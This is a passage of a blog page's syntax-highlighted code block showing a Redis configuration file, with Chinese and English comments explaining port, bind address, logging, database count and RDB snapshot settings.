class=\"line\">515</span><br><span class=\"line\">516</span><br><span class=\"line\">517</span><br><span class=\"line\">518</span><br><span class=\"line\">519</span><br><span class=\"line\">520</span><br><span class=\"line\">521</span><br><span class=\"line\">522</span><br><span class=\"line\">523</span><br><span class=\"line\">524</span><br><span class=\"line\">525</span><br><span class=\"line\">526</span><br><span class=\"line\">527</span><br><span class=\"line\">528</span><br><span class=\"line\">529</span><br><span class=\"line\">530</span><br><span class=\"line\">531</span><br><span class=\"line\">532</span><br><span class=\"line\">533</span><br><span class=\"line\">534</span><br><span class=\"line\">535</span><br><span class=\"line\">536</span><br><span class=\"line\">537</span><br><span class=\"line\">538</span><br><span class=\"line\">539</span><br><span class=\"line\">540</span><br><span class=\"line\">541</span><br><span class=\"line\">542</span><br><span class=\"line\">543</span><br><span class=\"line\">544</span><br><span class=\"line\">545</span><br><span class=\"line\">546</span><br><span class=\"line\">547</span><br><span class=\"line\">548</span><br><span class=\"line\">549</span><br><span class=\"line\">550</span><br><span class=\"line\">551</span><br><span class=\"line\">552</span><br><span class=\"line\">553</span><br><span class=\"line\">554</span><br><span class=\"line\">555</span><br><span class=\"line\">556</span><br><span class=\"line\">557</span><br><span class=\"line\">558</span><br><span class=\"line\">559</span><br><span class=\"line\">560</span><br><span class=\"line\">561</span><br><span class=\"line\">562</span><br><span class=\"line\">563</span><br><span class=\"line\">564</span><br><span class=\"line\">565</span><br><span class=\"line\">566</span><br><span class=\"line\">567</span><br><span class=\"line\">568</span><br><span class=\"line\">569</span><br><span class=\"line\">570</span><br><span class=\"line\">571</span><br><span class=\"line\">572</span><br><span class=\"line\">573</span><br><span class=\"line\">574</span><br><span class=\"line\">575</span><br><span class=\"line\">576</span><br><span class=\"line\">577</span><br><span class=\"line\">578</span><br><span class=\"line\">579</span><br><span class=\"line\">580</span><br><span class=\"line\">581</span><br><span class=\"line\">582</span><br><span class=\"line\">583</span><br><span class=\"line\">584</span><br><span class=\"line\">585</span><br><span class=\"line\">586</span><br><span class=\"line\">587</span><br><span class=\"line\">588</span><br><span class=\"line\">589</span><br><span class=\"line\">590</span><br><span class=\"line\">591</span><br><span class=\"line\">592</span><br><span class=\"line\">593</span><br><span class=\"line\">594</span><br><span class=\"line\">595</span><br><span class=\"line\">596</span><br><span class=\"line\">597</span><br><span class=\"line\">598</span><br><span class=\"line\">599</span><br><span class=\"line\">600</span><br><span class=\"line\">601</span><br><span class=\"line\">602</span><br><span class=\"line\">603</span><br><span class=\"line\">604</span><br><span class=\"line\">605</span><br><span class=\"line\">606</span><br><span class=\"line\">607</span><br><span class=\"line\">608</span><br><span class=\"line\">609</span><br><span class=\"line\">610</span><br><span class=\"line\">611</span><br><span class=\"line\">612</span><br><span class=\"line\">613</span><br><span class=\"line\">614</span><br><span class=\"line\">615</span><br><span class=\"line\">616</span><br><span class=\"line\">617</span><br><span class=\"line\">618</span><br><span class=\"line\">619</span><br><span class=\"line\">620</span><br><span class=\"line\">621</span><br><span class=\"line\">622</span><br><span class=\"line\">623</span><br><span class=\"line\">624</span><br><span class=\"line\">625</span><br><span class=\"line\">626</span><br><span class=\"line\">627</span><br><span class=\"line\">628</span><br><span class=\"line\">629</span><br><span class=\"line\">630</span><br><span class=\"line\">631</span><br><span class=\"line\">632</span><br><span class=\"line\">633</span><br><span class=\"line\">634</span><br><span class=\"line\">635</span><br><span class=\"line\">636</span><br><span class=\"line\">637</span><br><span class=\"line\">638</span><br><span class=\"line\">639</span><br><span class=\"line\">640</span><br><span class=\"line\">641</span><br><span class=\"line\">642</span><br><span class=\"line\">643</span><br><span class=\"line\">644</span><br><span class=\"line\">645</span><br><span class=\"line\">646</span><br><span class=\"line\">647</span><br><span class=\"line\">648</span><br><span class=\"line\">649</span><br><span class=\"line\">650</span><br><span class=\"line\">651</span><br><span class=\"line\">652</span><br><span class=\"line\">653</span><br><span class=\"line\">654</span><br><span class=\"line\">655</span><br><span class=\"line\">656</span><br><span class=\"line\">657</span><br><span class=\"line\">658</span><br><span class=\"line\">659</span><br><span class=\"line\">660</span><br><span class=\"line\">661</span><br><span class=\"line\">662</span><br><span class=\"line\">663</span><br><span class=\"line\">664</span><br><span class=\"line\">665</span><br><span class=\"line\">666</span><br><span class=\"line\">667</span><br><span class=\"line\">668</span><br><span class=\"line\">669</span><br><span class=\"line\">670</span><br><span class=\"line\">671</span><br><span class=\"line\">672</span><br><span class=\"line\">673</span><br><span class=\"line\">674</span><br><span class=\"line\">675</span><br><span class=\"line\">676</span><br><span class=\"line\">677</span><br><span class=\"line\">678</span><br><span class=\"line\">679</span><br><span class=\"line\">680</span><br><span class=\"line\">681</span><br><span class=\"line\">682</span><br><span class=\"line\">683</span><br><span class=\"line\">684</span><br><span class=\"line\">685</span><br><span class=\"line\">686</span><br><span class=\"line\">687</span><br><span class=\"line\">688</span><br><span class=\"line\">689</span><br><span class=\"line\">690</span><br><span class=\"line\">691</span><br><span class=\"line\">692</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># redis &#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x793A;&#x4F8B;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;&#x4F60;&#x9700;&#x8981;&#x4E3A;&#x67D0;&#x4E2A;&#x914D;&#x7F6E;&#x9879;&#x6307;&#x5B9A;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5FC5;&#x987B;&#x8981;&#x5E26;&#x4E0A;&#x5355;&#x4F4D;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x901A;&#x5E38;&#x7684;&#x683C;&#x5F0F;&#x5C31;&#x662F; 1k 5gb 4m &#x7B49;&#x9171;&#x7D2B;&#xFF1A;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># 1k =&gt; 1000 bytes</span></span><br><span class=\"line\"><span class=\"comment\"># 1kb =&gt; 1024 bytes</span></span><br><span class=\"line\"><span class=\"comment\"># 1m =&gt; 1000000 bytes</span></span><br><span class=\"line\"><span class=\"comment\"># 1mb =&gt; 1024*1024 bytes</span></span><br><span class=\"line\"><span class=\"comment\"># 1g =&gt; 1000000000 bytes</span></span><br><span class=\"line\"><span class=\"comment\"># 1gb =&gt; 1024*1024*1024 bytes</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5185;&#x5B58;&#x914D;&#x7F6E;&#x5927;&#x5C0F;&#x5199;&#x662F;&#x4E00;&#x6837;&#x7684;.&#x6BD4;&#x5982; 1gb 1Gb 1GB 1gB</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">################################ &#x5E38;&#x7528; #####################################</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># daemonize no &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;redis&#x4E0D;&#x662F;&#x4F5C;&#x4E3A;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x8FD0;&#x884C;&#x7684;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x4F60;&#x60F3;&#x8BA9;&#x5B83;&#x5728;&#x540E;&#x53F0;&#x8FD0;&#x884C;&#xFF0C;&#x4F60;&#x5C31;&#x628A;&#x5B83;&#x6539;&#x6210; yes</span></span><br><span class=\"line\">daemonize yes</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;redis&#x5728;&#x540E;&#x53F0;&#x8FD0;&#x884C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x9ED8;&#x8BA4;&#x4F1A;&#x628A;pid&#x6587;&#x4EF6;&#x653E;&#x5728;/var/run/redis.pid&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x914D;&#x7F6E;&#x5230;&#x5176;&#x4ED6;&#x5730;&#x5740;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;&#x8FD0;&#x884C;&#x591A;&#x4E2A;redis&#x670D;&#x52A1;&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x6307;&#x5B9A;&#x4E0D;&#x540C;&#x7684;pid&#x6587;&#x4EF6;&#x548C;&#x7AEF;&#x53E3;</span></span><br><span class=\"line\">pidfile /var/run/redis.pid</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x6307;&#x5B9A;redis&#x8FD0;&#x884C;&#x7684;&#x7AEF;&#x53E3;&#xFF0C;&#x9ED8;&#x8BA4;&#x662F;6379</span></span><br><span class=\"line\">port 6379</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># TCP &#x76D1;&#x542C;&#x7684;&#x6700;&#x5927;&#x5BB9;&#x7EB3;&#x6570;&#x91CF;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5728;&#x9AD8;&#x5E76;&#x53D1;&#x7684;&#x73AF;&#x5883;&#x4E0B;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x628A;&#x8FD9;&#x4E2A;&#x503C;&#x8C03;&#x9AD8;&#x4EE5;&#x907F;&#x514D;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x7F13;&#x6162;&#x7684;&#x95EE;&#x9898;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># Linux &#x5185;&#x6838;&#x4F1A;&#x4E00;&#x58F0;&#x4E0D;&#x54CD;&#x7684;&#x628A;&#x8FD9;&#x4E2A;&#x503C;&#x7F29;&#x5C0F;&#x6210; /proc/sys/net/core/somaxconn &#x5BF9;&#x5E94;&#x7684;&#x503C;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x6240;&#x4EE5;&#x4F60;&#x8981;&#x4FEE;&#x6539;&#x8FD9;&#x4E24;&#x4E2A;&#x503C;&#x624D;&#x80FD;&#x8FBE;&#x5230;&#x4F60;&#x7684;&#x9884;&#x671F;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># tcp-backlog 511</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;redis &#x5728; server &#x4E0A;&#x6240;&#x6709;&#x6709;&#x6548;&#x7684;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x4E0A;&#x76D1;&#x542C;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F60;&#x5982;&#x679C;&#x53EA;&#x60F3;&#x8BA9;&#x5B83;&#x5728;&#x4E00;&#x4E2A;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x4E0A;&#x76D1;&#x542C;&#xFF0C;&#x90A3;&#x4F60;&#x5C31;&#x7ED1;&#x5B9A;&#x4E00;&#x4E2A;IP&#x6216;&#x8005;&#x591A;&#x4E2A;IP&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x793A;&#x4F8B;&#xFF0C;&#x591A;&#x4E2A;IP&#x7528;&#x7A7A;&#x683C;&#x9694;&#x5F00;:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># bind 192.168.1.100 10.0.0.1</span></span><br><span class=\"line\"><span class=\"built_in\">bind</span> 127.0.0.1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Specify the path for the unix socket that will be used to listen for</span></span><br><span class=\"line\"><span class=\"comment\"># incoming connections. There is no default, so Redis will not listen</span></span><br><span class=\"line\"><span class=\"comment\"># on a unix socket when not specified.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x6307;&#x5B9A; unix socket &#x7684;&#x8DEF;&#x5F84;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># unixsocket /tmp/redis.sock</span></span><br><span class=\"line\"><span class=\"comment\"># unixsocketperm 755</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x8BBE;&#x7F6E;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x65F6;&#x7684;&#x8D85;&#x65F6;&#x65F6;&#x95F4;&#xFF0C;&#x5355;&#x4F4D;&#x4E3A;&#x79D2;&#x3002;&#x5F53;&#x5BA2;&#x6237;&#x7AEF;&#x5728;&#x8FD9;&#x6BB5;&#x65F6;&#x95F4;&#x5185;&#x6CA1;&#x6709;&#x53D1;&#x51FA;&#x4EFB;&#x4F55;&#x6307;&#x4EE4;&#xFF0C;&#x90A3;&#x4E48;&#x5173;&#x95ED;&#x8BE5;&#x8FDE;&#x63A5;</span></span><br><span class=\"line\"><span class=\"comment\"># 0&#x662F;&#x5173;&#x95ED;&#x6B64;&#x8BBE;&#x7F6E;</span></span><br><span class=\"line\">timeout 0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># tcp &#x5FC3;&#x8DF3;&#x5305;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x4E3A;&#x975E;&#x96F6;&#xFF0C;&#x5219;&#x5728;&#x4E0E;&#x5BA2;&#x6237;&#x7AEF;&#x7F3A;&#x4E4F;&#x901A;&#x8BAF;&#x7684;&#x65F6;&#x5019;&#x4F7F;&#x7528; SO_KEEPALIVE &#x53D1;&#x9001; tcp acks &#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8FD9;&#x4E2A;&#x4E4B;&#x6240;&#x6709;&#x6709;&#x7528;&#xFF0C;&#x4E3B;&#x8981;&#x7531;&#x4E24;&#x4E2A;&#x539F;&#x56E0;&#xFF1A;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># 1) &#x9632;&#x6B62;&#x6B7B;&#x7684; peers</span></span><br><span class=\"line\"><span class=\"comment\"># 2) Take the connection alive from the point of view of network</span></span><br><span class=\"line\"><span class=\"comment\">#    equipment in the middle.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># On Linux, the specified value (in seconds) is the period used to send ACKs.</span></span><br><span class=\"line\"><span class=\"comment\"># Note that to close the connection the double of the time is needed.</span></span><br><span class=\"line\"><span class=\"comment\"># On other kernels the period depends on the kernel configuration.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># A reasonable value for this option is 60 seconds.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x63A8;&#x8350;&#x4E00;&#x4E2A;&#x5408;&#x7406;&#x7684;&#x503C;&#x5C31;&#x662F;60&#x79D2;</span></span><br><span class=\"line\">tcp-keepalive 0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x6307;&#x5B9A;&#x65E5;&#x5FD7;&#x8BB0;&#x5F55;&#x7EA7;&#x522B;</span></span><br><span class=\"line\"><span class=\"comment\"># Redis&#x603B;&#x5171;&#x652F;&#x6301;&#x56DB;&#x4E2A;&#x7EA7;&#x522B;&#xFF1A;debug&#x3001;verbose&#x3001;notice&#x3001;warning&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;verbose</span></span><br><span class=\"line\"><span class=\"comment\"># debug &#x8BB0;&#x5F55;&#x5F88;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x7528;&#x4E8E;&#x5F00;&#x53D1;&#x548C;&#x6D4B;&#x8BD5;</span></span><br><span class=\"line\"><span class=\"comment\"># varbose &#x6709;&#x7528;&#x7684;&#x4FE1;&#x606F;&#xFF0C;&#x4E0D;&#x50CF;debug&#x4F1A;&#x8BB0;&#x5F55;&#x90A3;&#x4E48;&#x591A;</span></span><br><span class=\"line\"><span class=\"comment\"># notice &#x666E;&#x901A;&#x7684;verbose&#xFF0C;&#x5E38;&#x7528;&#x4E8E;&#x751F;&#x4EA7;&#x73AF;&#x5883;</span></span><br><span class=\"line\"><span class=\"comment\"># warning &#x53EA;&#x6709;&#x975E;&#x5E38;&#x91CD;&#x8981;&#x6216;&#x8005;&#x4E25;&#x91CD;&#x7684;&#x4FE1;&#x606F;&#x4F1A;&#x8BB0;&#x5F55;&#x5230;&#x65E5;&#x5FD7;</span></span><br><span class=\"line\">loglevel debug</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x914D;&#x7F6E;log&#x6587;&#x4EF6;&#x5730;&#x5740;&#xFF0C;&#x4E0D;&#x540C;&#x7684;redis&#x5B9E;&#x4F8B;&#x8BBE;&#x7F6E;&#x4E0D;&#x540C;&#x7684;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#xFF0C;&#x4FBF;&#x4E8E;&#x95EE;&#x9898;&#x5B9A;&#x4F4D;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x9ED8;&#x8BA4;&#x503C;&#x4E3A;stdout&#xFF0C;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#xFF0C;&#x82E5;&#x540E;&#x53F0;&#x6A21;&#x5F0F;&#x4F1A;&#x8F93;&#x51FA;&#x5230;/dev/null</span></span><br><span class=\"line\"><span class=\"comment\"># logfile stdout</span></span><br><span class=\"line\">logfile /var/<span class=\"built_in\">log</span>/redis/redis.log</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x8981;&#x60F3;&#x628A;&#x65E5;&#x5FD7;&#x8BB0;&#x5F55;&#x5230;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#xFF0C;&#x5C31;&#x628A;&#x5B83;&#x6539;&#x6210; yes&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4E5F;&#x53EF;&#x4EE5;&#x53EF;&#x9009;&#x62E9;&#x6027;&#x7684;&#x66F4;&#x65B0;&#x5176;&#x4ED6;&#x7684;syslog &#x53C2;&#x6570;&#x4EE5;&#x8FBE;&#x5230;&#x4F60;&#x7684;&#x8981;&#x6C42;</span></span><br><span class=\"line\"><span class=\"comment\"># syslog-enabled no</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x8BBE;&#x7F6E; syslog &#x7684; identity&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># syslog-ident redis</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x8BBE;&#x7F6E; syslog &#x7684; facility&#xFF0C;&#x5FC5;&#x987B;&#x662F; USER &#x6216;&#x8005;&#x662F; LOCAL0-LOCAL7 &#x4E4B;&#x95F4;&#x7684;&#x503C;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># syslog-facility local0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x8BBE;&#x7F6E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6570;&#x76EE;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x9ED8;&#x8BA4;&#x6570;&#x636E;&#x5E93;&#x662F; DB 0&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x5728;&#x6BCF;&#x4E2A;&#x8FDE;&#x63A5;&#x4E0A;&#x4F7F;&#x7528; select &lt;dbid&gt; &#x547D;&#x4EE4;&#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x4E0D;&#x540C;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F46;&#x662F; dbid &#x5FC5;&#x987B;&#x662F;&#x4E00;&#x4E2A;&#x4ECB;&#x4E8E; 0 &#x5230; databasees - 1 &#x4E4B;&#x95F4;&#x7684;&#x503C;</span></span><br><span class=\"line\">databases 16</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">################################ &#x5FEB;&#x7167; #################################</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5B58; DB &#x5230;&#x78C1;&#x76D8;&#xFF1A;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#   &#x683C;&#x5F0F;&#xFF1A;save &lt;&#x95F4;&#x9694;&#x65F6;&#x95F4;&#xFF08;&#x79D2;&#xFF09;&gt; &lt;&#x5199;&#x5165;&#x6B21;&#x6570;&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#   &#x6839;&#x636E;&#x7ED9;&#x5B9A;&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x548C;&#x5199;&#x5165;&#x6B21;&#x6570;&#x5C06;&#x6570;&#x636E;&#x4FDD;&#x5B58;&#x5230;&#x78C1;&#x76D8;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#   &#x4E0B;&#x9762;&#x7684;&#x4F8B;&#x5B50;&#x7684;&#x610F;&#x601D;&#x662F;&#xFF1A;</span></span><br><span class=\"line\"><span class=\"comment\">#   900 &#x79D2;&#x5185;&#x5982;&#x679C;&#x81F3;&#x5C11;&#x6709; 1 &#x4E2A; key &#x7684;&#x503C;&#x53D8;&#x5316;&#xFF0C;&#x5219;&#x4FDD;&#x5B58;</span></span><br><span class=\"line\"><span class=\"comment\">#   300 &#x79D2;&#x5185;&#x5982;&#x679C;&#x81F3;&#x5C11;&#x6709; 10 &#x4E2A; key &#x7684;&#x503C;&#x53D8;&#x5316;&#xFF0C;&#x5219;&#x4FDD;&#x5B58;</span></span><br><span class=\"line\"><span class=\"comment\">#   60 &#x79D2;&#x5185;&#x5982;&#x679C;&#x81F3;&#x5C11;&#x6709; 10000 &#x4E2A; key &#x7684;&#x503C;&#x53D8;&#x5316;&#xFF0C;&#x5219;&#x4FDD;&#x5B58;</span></span><br><span class=\"line\"><span class=\"comment\">#&#x3000;&#x3000;</span></span><br><span class=\"line\"><span class=\"comment\">#   &#x6CE8;&#x610F;&#xFF1A;&#x4F60;&#x53EF;&#x4EE5;&#x6CE8;&#x91CA;&#x6389;&#x6240;&#x6709;&#x7684; save &#x884C;&#x6765;&#x505C;&#x7528;&#x4FDD;&#x5B58;&#x529F;&#x80FD;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#   &#x4E5F;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4E00;&#x4E2A;&#x7A7A;&#x5B57;&#x7B26;&#x4E32;&#x6765;&#x5B9E;&#x73B0;&#x505C;&#x7528;&#xFF1A;</span></span><br><span class=\"line\"><span class=\"comment\">#   save &quot;&quot;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">save 900 1</span><br><span class=\"line\">save 300 10</span><br><span class=\"line\">save 60 10000</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5982;&#x679C; redis &#x6700;&#x540E;&#x4E00;&#x6B21;&#x7684;&#x540E;&#x53F0;&#x4FDD;&#x5B58;&#x5931;&#x8D25;&#xFF0C;redis &#x5C06;&#x505C;&#x6B62;&#x63A5;&#x53D7;&#x5199;&#x64CD;&#x4F5C;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8FD9;&#x6837;&#x4EE5;&#x4E00;&#x79CD;&#x5F3A;&#x786C;&#x7684;&#x65B9;&#x5F0F;&#x8BA9;&#x7528;&#x6237;&#x77E5;&#x9053;&#x6570;&#x636E;&#x4E0D;&#x80FD;&#x6B63;&#x786E;&#x7684;&#x6301;&#x4E45;&#x5316;&#x5230;&#x78C1;&#x76D8;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5426;&#x5219;&#x5C31;&#x4F1A;&#x6CA1;&#x4EBA;&#x6CE8;&#x610F;&#x5230;&#x707E;&#x96BE;&#x7684;&#x53D1;&#x751F;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x540E;&#x53F0;&#x4FDD;&#x5B58;&#x8FDB;&#x7A0B;&#x91CD;&#x65B0;&#x542F;&#x52A8;&#x5DE5;&#x4F5C;&#x4E86;&#xFF0C;redis &#x4E5F;&#x5C06;&#x81EA;&#x52A8;&#x7684;&#x5141;&#x8BB8;&#x5199;&#x64CD;&#x4F5C;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x7136;&#x800C;&#x4F60;&#x8981;&#x662F;&#x5B89;&#x88C5;&#x4E86;&#x9760;&#x8C31;&#x7684;&#x76D1;&#x63A7;&#xFF0C;&#x4F60;&#x53EF;&#x80FD;&#x4E0D;&#x5E0C;&#x671B; redis &#x8FD9;&#x6837;&#x505A;&#xFF0C;&#x90A3;&#x4F60;&#x5C31;&#x6539;&#x6210; no &#x597D;&#x4E86;&#x3002;</span></span><br><span class=\"line\">stop-writes-on-bgsave-error yes</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x662F;&#x5426;&#x5728; dump .rdb &#x6570;&#x636E;&#x5E93;&#x7684;&#x65F6;&#x5019;&#x4F7F;&#x7528; LZF &#x538B;&#x7F29;&#x5B57;&#x7B26;&#x4E32;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x9ED8;&#x8BA4;&#x90FD;&#x8BBE;&#x4E3A; yes</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x4F60;&#x5E0C;&#x671B;&#x4FDD;&#x5B58;&#x5B50;&#x8FDB;&#x7A0B;&#x8282;&#x7701;&#x70B9; cpu &#xFF0C;&#x4F60;&#x5C31;&#x8BBE;&#x7F6E;&#x5B83;&#x4E3A; no &#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4E0D;&#x8FC7;&#x8FD9;&#x4E2A;&#x6570;&#x636E;&#x96C6;&#x53EF;&#x80FD;&#x5C31;&#x4F1A;&#x6BD4;&#x8F83;&#x5927;</span></span><br><span class=\"line\">rdbcompression yes</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x662F;&#x5426;&#x6821;&#x9A8C;rdb&#x6587;&#x4EF6;</span></span><br><span class=\"line\">rdbchecksum yes</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x672C;&#x5730;&#x6301;&#x4E45;&#x5316;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;dump.rdb</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4E0D;&#x540C;&#x7684;redis&#x5B9E;&#x4F8B;&#x8BBE;&#x7F6E;&#x4E0D;&#x540C;&#x7684;db&#x6587;&#x4EF6;&#xFF0C;&#x4FBF;&#x4E8E;&#x95EE;&#x9898;&#x5B9A;&#x4F4D;</span></span><br><span class=\"line\">dbfilename dump.rdb</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x5DE5;&#x4F5C;&#x76EE;&#x5F55;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x6570;&#x636E;&#x5E93;&#x955C;&#x50CF;&#x5907;&#x4EFD;&#x7684;&#x6587;&#x4EF6;&#x653E;&#x7F6E;&#x7684;&#x8DEF;&#x5F84;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8FD9;&#x91CC;&#x7684;&#x8DEF;&#x5F84;&#x8DDF;&#x6587;&#x4EF6;&#x540D;&#x8981;&#x5206;&#x5F00;&#x914D;&#x7F6E;&#x662F;&#x56E0;&#x4E3A;redis&#x5728;&#x8FDB;&#x884C;&#x5907;&#x4EFD;&#x65F6;&#xFF0C;&#x5148;&#x4F1A;&#x5C06;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x7684;&#x72B6;&#x6001;&#x5199;&#x5165;&#x5230;&#x4E00;&#x4E2A;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x7B49;&#x5907;&#x4EFD;&#x5B8C;&#x6210;&#x65F6;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x518D;&#x628A;&#x8BE5;&#x8BE5;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x66FF;&#x6362;&#x4E3A;&#x4E0A;&#x9762;&#x6240;&#x6307;&#x5B9A;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x800C;&#x8FD9;&#x91CC;&#x7684;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x548C;&#x4E0A;&#x9762;&#x6240;&#x914D;&#x7F6E;&#x7684;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x90FD;&#x4F1A;&#x653E;&#x5728;&#x8FD9;&#x4E2A;&#x6307;&#x5B9A;&#x7684;&#x8DEF;&#x5F84;&#x5F53;&#x4E2D;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># AOF&#x6587;&#x4EF6;&#x4E5F;&#x4F1A;&#x5B58;&#x653E;&#x5728;&#x8FD9;&#x4E2A;&#x76EE;&#x5F55;&#x4E0B;&#x9762;</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># 